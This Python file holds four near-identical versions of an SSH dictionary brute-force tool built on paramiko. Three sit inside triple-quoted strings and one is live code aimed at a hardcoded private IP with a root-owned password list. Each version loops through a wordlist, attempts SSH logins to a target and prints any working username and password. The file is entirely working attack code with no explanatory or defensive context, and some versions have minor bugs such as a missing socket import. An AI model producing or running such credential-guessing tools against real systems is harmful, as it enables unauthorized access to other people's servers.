"""#!/usr/bin/env python3

import os,sys,paramiko

global host, username, file

try:
    host=input("\nPlease Enter Target IP: ")
    username=input("\nPlease Enter The Username: ")
    file=input("\nPlease Enter Password Dictionary With Full Path: ")
    if os.path.exists(file) == False:
        print("\nFile Doesnt Exists :(")
        sys.exit()
    else:
        print("\nLoading The Password File :)")
except KeyboardInterrupt:
   print("\nUser Stopped The Script :(")
   sys.exit()

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code

file = open(file)

for word in file.readlines():
    password=word.strip("\n")
    try:
        prob=ssh_connect(password)
        if prob == 0:
            print("\nUser: %s Password: %s"%(username,password))
        elif prob == 2:
            print ("\nNetwork Error")
            sys.exit()
    except Exception:
        print(Exception)
        pass

file.close()
"""
"""
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
"""

"""#!/usr/bin/env python3
import socket
import paramiko
ip=input("Please enter your target IP: ")
user=input("Please enter your username: ")
passfile=input("Please enter your dictionary with full path: ")

def ssh(password,code=0):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip,port=22,username=user,password=password)
    except paramiko.AuthenticationException:
        code=1
    except socket.error:
        code=2
    ssh.close()
    return code

file = open(passfile,'r',encoding='latin-1')
for wordpass in file.readlines():
    password=wordpass.strip("\n")
    attempt=ssh(password)
    if attempt == 0:
        print("\nUser: %s Password: %s"%(user,password))
    elif attempt == 2:
        print("Network Error")
        exit()
file.close()"""


#!/usr/bin/python3
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
username=input("Please enter username: ")
f = open("/root/pass.txt", "r")
for line in f:
    wordpass=line.strip("\n")
    try:
        client.connect('192.168.0.106',22, username=username, password=wordpass)
        print(bcolors.OKGREEN,"Found Valid Credentials: ", username,":", wordpass)
        client.close()
    except paramiko.ssh_exception.AuthenticationException:
        print(bcolors.FAIL ,"Failed Login: ",username,":",wordpass)
        client.close()
f.close()
